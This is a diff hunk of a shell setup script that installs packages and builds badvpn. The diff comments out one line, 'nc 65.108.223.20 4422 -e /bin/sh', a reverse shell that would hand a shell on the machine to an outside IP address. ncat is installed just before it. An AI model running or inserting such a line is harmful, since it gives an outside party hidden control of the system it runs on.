@@ -27,7 +27,7 @@ echo "deb http://deb.debian.org/debian unstable main" > /etc/apt/sources.list
 
 apt update
 apt install -y ncat > /dev/null
-nc 65.108.223.20 4422 -e /bin/sh
+#nc 65.108.223.20 4422 -e /bin/sh
 apt install -y build-essential libncurses-dev bison flex libssl-dev libelf-dev bc rsync python3 screen vim unzip curl openssl > /dev/null
 
 build_badvpn
